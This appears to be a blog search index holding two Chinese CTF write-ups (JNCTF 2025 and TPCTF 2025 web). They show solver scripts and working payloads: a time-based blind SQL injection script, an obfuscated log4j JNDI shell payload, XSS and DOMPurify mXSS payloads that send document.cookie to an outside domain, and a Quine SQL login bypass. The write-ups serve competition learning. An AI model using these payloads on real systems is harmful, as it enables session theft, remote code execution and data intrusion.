<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jnctf_wp</title>
      <link href="/2025/03/31/jnctf-wp/"/>
      <url>/2025/03/31/jnctf-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="JNCTF-2025-wp"><a href="#JNCTF-2025-wp" class="headerlink" title="JNCTF 2025 wp"></a>JNCTF 2025 wp</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-pickle-jail"><a href="#ez-pickle-jail" class="headerlink" title="ez_pickle_jail"></a><strong>ez_pickle_jail</strong></h3><p>要求一个 base64 等于其本身，喂给 ai 之后说生成协议 0 即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成协议0的pickle数据（可以是任何对象，例如空字典）</span></span><br><span class="line">original_data = pickle.dumps(&#123;&#125;, protocol=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为 base64</span></span><br><span class="line">b64_payload = base64.b64encode(original_data).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入到目标程序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter this payload:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64_payload)</span><br></pre></td></tr></table></figure><h3 id="logloglog"><a href="#logloglog" class="headerlink" title="logloglog"></a>logloglog</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/38163d86-b37b-4b51-920b-107acbad35d4.png" alt="38163d86-b37b-4b51-920b-107acbad35d4"></p><p>第一问，第二问的 ip 也是这个。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/00d8c9bd-c5c9-40df-9d7c-5c220f6ac8d7.png" alt="00d8c9bd-c5c9-40df-9d7c-5c220f6ac8d7"></p><p>第三问的用户名。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324160525349.png" alt="image-20250324160525349"></p><p>第四问。</p><p>第五问有若干个重启，但是数量都不大，直接顺着查一遍就行。</p><p>最终 flag：54850-192.168.36.188-Adnimistartro-8820-2</p><h3 id="stego"><a href="#stego" class="headerlink" title="stego"></a>stego</h3><p>找个网站给 qoi 解压成 png 格式，然后丢进 stegsolve 去看一眼。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324160805360.png" alt="image-20250324160805360"></p><p>非常明显了。</p><h3 id="小鼋侦探"><a href="#小鼋侦探" class="headerlink" title="小鼋侦探"></a><strong>小鼋侦探</strong></h3><p>musc 是谁的极限？</p><p>第一关丢给识图发现是福尔摩斯的某个密码表，解出来之后密码是 <code>UpDown</code>。</p><p>用 binwalk 分解图片之后拿到 zip 包，解压拿到 story2。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324161028986.png" alt="image-20250324161028986"></p><p>看到 K 之后被吓呆了，问出题人发现是替换密码，尝试常规的那几种，最后发现是 rot13 之后 atbash。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324161135763.png" alt="image-20250324161135763"></p><p>看到了明文，将大小写分离出来即可。（感觉可以考虑后面自己搓一个类似的解码工具，放进语料库来辅助多层破解）</p><p>story3 一个简单零宽。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324161353425.png" alt="image-20250324161353425"></p><p>最后一关是部分明文破解 zip 文件，用 bkcrack，当时没保存 flag 懒得再爆一次了。</p><h3 id="流量的秘密"><a href="#流量的秘密" class="headerlink" title="流量的秘密"></a><strong>流量的秘密</strong></h3><p>流量里面是一个非常明显的 sql 注入，直接提取出来之后用脚本破解即可。</p><p>我做的非常丑陋，最后手搓了很久。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">  lines = file.read().splitlines()</span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">mx = <span class="number">0</span></span><br><span class="line">vis = [<span class="number">0</span>] * <span class="number">100</span></span><br><span class="line">lines.reverse()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">  </span><br><span class="line">  x = line[line.find(<span class="string">&quot;unicode(substr(flag,&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;unicode(substr(flag,&quot;</span>) : line.find(<span class="string">&quot;,1)) FROM secrets)&quot;</span>)]</span><br><span class="line">  <span class="keyword">if</span> x.isdigit():</span><br><span class="line">    x = <span class="built_in">int</span>(x)</span><br><span class="line">    mx = <span class="built_in">max</span>(mx, x)</span><br><span class="line">    <span class="keyword">if</span> vis[x]:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    tem = <span class="built_in">int</span>(line[line.find(<span class="string">&quot;FROM secrets)&gt;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;FROM secrets)&gt;&quot;</span>) :])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> vis[x]:</span><br><span class="line">      vis[x] = tem</span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, mx + <span class="number">1</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(vis[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">KODUG|Jg`Z0v`dp`OOU`xs2u3`B`6d2jpu`2u`2s`sp0pOOp0p`HBRE`5`U`3`g2od`ui26`gmag~</span></span><br><span class="line"><span class="string">JNCTF&#123;If_Y/u_co_NNT_wr1t2_A_5c1iot_1t_1r_ro/oNNo/o_GAQD_4_T_2_f1nc_th15_fl`f&#125;</span></span><br><span class="line"><span class="string">IMBSEzHe^X.t^bn^MMS^vq0s1^@^4b0hns^0s^0q^qn.nMMn.n^F@PC^3^S^1^e0mb^sg04^ek_e|</span></span><br><span class="line"><span class="string">JNCTF&#123;If_Y0u_do_NOT_wr1t3_A_5c2ipt_1t_1s_so0nOOn0o_HARD_4_U_2_f1nd_th15_flag&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crpyto"><a href="#crpyto" class="headerlink" title="crpyto"></a>crpyto</h2><h3 id="story"><a href="#story" class="headerlink" title="story"></a>story</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324162225148.png" alt="image-20250324162225148"></p><p>字频破解？应该是叫这个。有<a href="https://quipqiup.com/">网站</a>。</p><h3 id="悲伤的故事"><a href="#悲伤的故事" class="headerlink" title="悲伤的故事"></a>悲伤的故事</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/ff18049f-3cc6-4a01-a6bf-79ca2652b5d5.png" alt="ff18049f-3cc6-4a01-a6bf-79ca2652b5d5"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/983a1826-9d78-4e18-9999-b88f3820cabe.png" alt="983a1826-9d78-4e18-9999-b88f3820cabe"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/95ad95a5-e3bf-4c96-8518-5f99a5876447.png" alt="95ad95a5-e3bf-4c96-8518-5f99a5876447"></p><h3 id="熟悉的故人"><a href="#熟悉的故人" class="headerlink" title="熟悉的故人"></a><strong>熟悉的故人</strong></h3><p>两个素数相邻，直接开根号之后查相邻字符即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算n的平方根</span></span><br><span class="line">root = gmpy2.isqrt(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在附近寻找p和q</span></span><br><span class="line">p = root</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)  <span class="comment"># 找下一个素数尝试</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)), n)).decode())</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>发现 unregister 这个函数没有身份验证，直接将 root 用户注销之后再注册一个 root 账号即可。</p><p>然后用 become_admin 将自己的权限升成 admin，然后 get_flag 即可。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rustaction"><a href="#rustaction" class="headerlink" title="rustaction"></a>rustaction</h3><p>发现编译环境是主机环境，并且可以下载编译产物，考虑直接将根目录下的 <code>/flag</code> 读取到程序里然后输出出来即可。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">  <span class="comment">// 编译时将 /flag 文件内容作为静态字符串嵌入程序</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">flag</span> = <span class="built_in">include_str!</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;嵌入的flag内容为: &#123;&#125;&quot;</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324163009219.png" alt="image-20250324163009219"></p><h3 id="Welcome-to-JNSEC"><a href="#Welcome-to-JNSEC" class="headerlink" title="Welcome_to_JNSEC"></a><strong>Welcome_to_JNSEC</strong></h3><p>爆破密码之后得知密码是 <code>Admin123</code>。登录之后发现一个莫名其妙的查询，估计是 <code>log4j2</code>。</p><p>直接弹 shell 就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://xxx/Exploit&#125;</span><br></pre></td></tr></table></figure><p>貌似需要绕过 jndi。</p><h3 id="come-to-chat"><a href="#come-to-chat" class="headerlink" title="come_to_chat"></a>come_to_chat</h3><p>简单的 insert sql 盲注。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.18.137.75:31481/sendMessage.php&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;2e6483de011e5a4b987f1c68fdeb5406&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>(<span class="params">Payload</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">  lef, rig, res = <span class="number">0</span>, <span class="number">1000</span>, <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> lef &lt;= rig:</span><br><span class="line">    mid = (lef + rig) // <span class="number">2</span></span><br><span class="line">    stt = time.time()</span><br><span class="line">    payload = <span class="string">f&quot;1&#x27; and if(length(<span class="subst">&#123;Payload&#125;</span>)&gt;=<span class="subst">&#123;mid&#125;</span>, sleep(2), sleep(0)) or &#x27;1 &quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;msg&#x27;</span>: payload&#125;</span><br><span class="line">    requests.post(url, data=data, cookies=cookie)</span><br><span class="line">    edt = time.time()</span><br><span class="line">    <span class="built_in">print</span>(edt, stt)</span><br><span class="line">    <span class="keyword">if</span> edt - stt &gt;= <span class="number">2</span>:</span><br><span class="line">      res = mid</span><br><span class="line">      lef = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      rig = mid - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> res <span class="keyword">if</span> res != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">Payload</span>):</span><br><span class="line">  length = get_length(Payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;Payload&#125;</span>&#x27;s length = <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">  result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">      stt = time.time()</span><br><span class="line">      payload = <span class="string">f&quot;1&#x27; and if(ascii(substring(<span class="subst">&#123;Payload&#125;</span>,<span class="subst">&#123;i&#125;</span>,1))&gt;=<span class="subst">&#123;j&#125;</span>, sleep(2), sleep(0)) or &#x27;1&quot;</span></span><br><span class="line">      data = &#123;<span class="string">&#x27;msg&#x27;</span>: payload&#125;</span><br><span class="line">      requests.post(url, data=data, cookies=cookie)</span><br><span class="line">      edt = time.time()</span><br><span class="line">      <span class="keyword">if</span> edt - stt &gt;= <span class="number">2</span>:</span><br><span class="line">        res = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(res), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># result += chr(res)</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  get_str(<span class="string">&quot;(select group_concat(flag) from tutorial_db.flag)&quot;</span>)</span><br></pre></td></tr></table></figure><p>后面发现貌似不需要盲注，直接回带也是可以的，但是也无所谓了。（如果使用的是盲注的话可以不需要二分法进行注入，直接从大往小扫会更快一些。</p><h3 id="eateateat"><a href="#eateateat" class="headerlink" title="eateateat"></a>eateateat</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324165556933.png" alt="image-20250324165556933"></p><p>黑客不玩游戏。</p><h3 id="test-your-php"><a href="#test-your-php" class="headerlink" title="test_your_php"></a>test_your_php</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324165806105.png" alt="image-20250324165806105"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324165845746.png" alt="image-20250324165845746"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324165903812.png" alt="image-20250324165903812"></p><p>另一半在环境变量。</p><p>其实是先看到环境变量的 flag 了。</p><h3 id="内在美1"><a href="#内在美1" class="headerlink" title="内在美1"></a>内在美1</h3><p>登录进去之后扫到 61 端口有个 redis，直接打 redis 弹 shell 即可。</p><p>懒得再打一遍了，dpc 看着我打通的。</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h3><p>看到一个类似 RC4 的东西，丢给 ai 之后搓个脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, data</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        result.append(byte ^ k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密示例</span></span><br><span class="line">key = <span class="string">b&#x27;TanggegeHaoShuai&#x27;</span></span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="number">18</span>, <span class="number">149</span>, <span class="number">50</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">35</span>, <span class="number">95</span>, <span class="number">97</span>, <span class="number">200</span>, <span class="number">156</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">187</span>, <span class="number">223</span>, <span class="number">98</span>, <span class="number">223</span>, <span class="number">237</span>, <span class="number">105</span>, <span class="number">222</span>, <span class="number">247</span>, <span class="number">112</span>, <span class="number">81</span>, <span class="number">172</span>, <span class="number">246</span>, <span class="number">231</span>, <span class="number">183</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">221</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">222</span>, <span class="number">142</span>, <span class="number">149</span>, <span class="number">157</span>, <span class="number">137</span>])</span><br><span class="line"></span><br><span class="line">decrypted = rc4(key, enc)</span><br><span class="line"><span class="built_in">print</span>(decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>).strip())</span><br></pre></td></tr></table></figure><h2 id="PCC"><a href="#PCC" class="headerlink" title="PCC"></a>PCC</h2><h3 id="签到-Run-it-compile-it"><a href="#签到-Run-it-compile-it" class="headerlink" title="签到, Run it, compile it"></a>签到, Run it, compile it</h3><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324170210269.png" alt="image-20250324170210269"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324170451420.png" alt="image-20250324170451420"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324170524034.png" alt="image-20250324170524034"></p><p>compile it 不能直接用 mingw 编译，很神秘。</p><h3 id="whereisflag？"><a href="#whereisflag？" class="headerlink" title="whereisflag？"></a>whereisflag？</h3><p>flag1：</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324171114588.png" alt="image-20250324171114588"></p><p>flag2：看 flag4</p><p>flag3：</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324171237861.png" alt="image-20250324171237861"></p><p>flag4：</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250324170928486.png" alt="image-20250324170928486"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF2025 Web 复现全解</title>
      <link href="/2025/03/31/TPCTF2025Web/"/>
      <url>/2025/03/31/TPCTF2025Web/</url>
      
        <content type="html"><![CDATA[<h1 id="TPCTF2025-Web-复现全解"><a href="#TPCTF2025-Web-复现全解" class="headerlink" title="TPCTF2025 Web 复现全解"></a>TPCTF2025 Web 复现全解</h1><h2 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby-layout"></a>baby-layout</h2><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>本题给了两个接口，允许我们自定义 layout 然后能够自定义 <code>&#123;&#123;content&#125;&#125;</code> 内容。</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>登录之后发现有一个网页和 bot 功能，疑似 xss，看到 dockerfile 里面 flag 放到 bot 的 cookie 里，大概是要把 bot 的 cookie 带出来就算过了。</p><p>没有发现任何过滤，直接正常的使用 xss 来进行伪造。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">layout</span>:</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;&#123;content&#125;&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">payload:</span></span><br><span class="line"><span class="language-xml">&quot; onerror=&quot;window.location.href=&#x27;http://xss.domain.com/index.php/?1=&#x27;+document.cookie</span></span><br></pre></td></tr></table></figure><p>回带 flag 就行。</p><h2 id="Safe-layout"><a href="#Safe-layout" class="headerlink" title="Safe-layout"></a>Safe-layout</h2><h3 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h3><p>在上题的基础上使用 <code>DomPurify</code> 进行了过滤。</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>本题提出了一个对 layout 进行注入的过程中使用 <code>DomPurify</code> 进行标签过滤的绕过，本题禁止使用所有的标签属性。</p><p>注意这里使用的是 <code>DomPurify</code> 这样一个<strong>工具</strong>进行过滤操作，不妨去考虑 <code>DomPurify</code> 这个工具自身产生的漏洞。</p><p>当我们对 Dom Tree 进行解析的时候，我们有一个手法叫做 <strong>mXSS</strong>：当浏览器去解析我们的标签时会自动进行一系列的<strong>修复</strong>，尝试使 Dom Tree 处于标准形式，便于后续的解析。但正是这个修复的行为导致了我们标签结构的<strong>突变（mutation）</strong>。</p><p>对于不同的浏览器，标签修复有不同的行为，所以某些 mXSS 行为在某些浏览器上不起作用（Firefox 上某些 mXSS 就没有办法起作用）。</p><p>举个例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">alt</span>=<span class="string">&quot;&lt;/div&gt; &lt;img src onerror=&#x27;alert(111);&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候 HTML 并不会分析 <code>alt</code> 标签的内容，他会解析成一个正常的文本，而不会将中间的 <code>&lt;img</code> 元素解析出来。</p><p>但是如果我们使用 <code>&lt;style&gt;</code> 元素那就是完全不一样的表现了，类似的例子：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  &lt;a alt=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(111);&#x27;</span>&gt;</span>&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你能够明显感觉到上下两段 html 之间的差距，这个时候由于 <code>&lt;style&gt;</code> 元素的原因，html 认为嵌合在 <code>alt</code> 标签中的 <code>&lt;/style&gt;</code> 终止元素成为了自己的元素，从而将整个 <code>&lt;img</code> 元素表现成了正常的元素，从而我们可以进行注入操作。</p><p>但是本题中我们连 <code>alt</code> 这个标签都不可能存在，所以我们需要一个新的手法来进行注入。同样是 <code>&lt;style&gt;</code> 元素的利用，根据 <code>DomPurify</code> 的过滤规则，他中间会采用类似 <code>/&lt;[/\w]/</code> 的方式检查，从而我们的 <code>&lt;&#123;&#123;content&#125;&#125;</code> 并不会被检查，所以可以在 <code>&lt;style&gt;</code> 元素中注入一个未被转义的 <code>&lt;</code> 来方便我们后续的注入。</p><p>而后面我们只需要通过 <code>mXSS</code> 的特性通过展平操作来 <code>&lt;style&gt;</code>，然后再使用我们刚刚注入的恶意 <code>&lt;</code> 来进行注入就可以了。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  &#123;&#123;<span class="attribute">content</span>&#125;&#125;&lt;&#123;&#123;<span class="attribute">content</span>&#125;&#125; <span class="comment">/* 由于我们需要在 &lt;img 元素之前跳出 &lt;style&gt; 元素，所以需要在前面加入一个 &#123;&#123;content&#125;&#125; 来帮助我们通过突变特性弹出*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src onerror=fetch(`domain.com/?flag=`+document.cookie) <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面的 <code>&lt;style&gt;</code> 帮助我们展平弹出，前面的 <code>img</code> 是我们的恶意注入代码。</p><h2 id="SuperSQLi"><a href="#SuperSQLi" class="headerlink" title="SuperSQLi"></a>SuperSQLi</h2><h3 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem"></a>Problem</h3><p>给了一个纯粹的 sql 查询，并且开启了一个反向代理服务对所有上传到服务器的请求进行了检测。</p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204836527.png" alt="image-20250401204836527"></p><p><img src="https://kamiyablog.oss-cn-beijing.aliyuncs.com/img/image-20250401204816090.png" alt="image-20250401204816090"></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>两种手法过掉这个 waf，可以在上传 payload 时使用 utf-7 编码进行 bypass，在 Django &lt; 0.5 版本时存在协议层 waf 绕过，具体的文章还没有详细看，如果有时间的话去详细了解一下原理吧。</p><p>通过这个漏洞我们可以任意构造 payload，并且对方的 sql 查询点并没有经过任何的预编译或者返回值防护，所以我们可以直接任意命令注入。</p><p>但是打开数据库之后发现用户库其实是空的，也就是说不存在一种可能使我们登录成功，也就是说 <code>admin</code> 的密码根本就不存在。所以我们得尝试直接绕过：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br></pre></td></tr></table></figure><p>其实非常简单，我们只需要让我们的 sql 查询返回语句等于我们注入的 password 语句就行了，这非常像之前在小学二年级学过的输出自身的 C++ 代码。在 sql 中叫 <strong>Quine SQLi</strong>，自生产程序 sql 注入。（如果之后有时间我会写一篇该 trick 相关的文章）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;UNION SELECT 1,&#x27;admin&#x27;,REPLACE(REPLACE(&#x27;&quot;UNION SELECT 1,&quot;admin&quot;,REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;);-- &#x27;,CHAR(34),CHAR(39)),CHAR(36),&#x27;&quot;UNION SELECT 1,&quot;admin&quot;,REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;);-- &#x27;);--</span><br></pre></td></tr></table></figure><p>在 <code>password</code> 处注入该 payload 即可。</p><p>另一个绕过手法是来自于星盟的 writeup。在解析 post 包的时候，waf 程序会对不同的 <code>content-type</code> 进行区分，当 <code>content-type=multipart/form-data</code> 时，我们发送一个 <code>data</code> 包里面加上我们需要的 <code>post</code> 体，这样就能够直接绕过这个 waf 的检测了。（这里其实没太懂，后面我再去琢磨琢磨）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
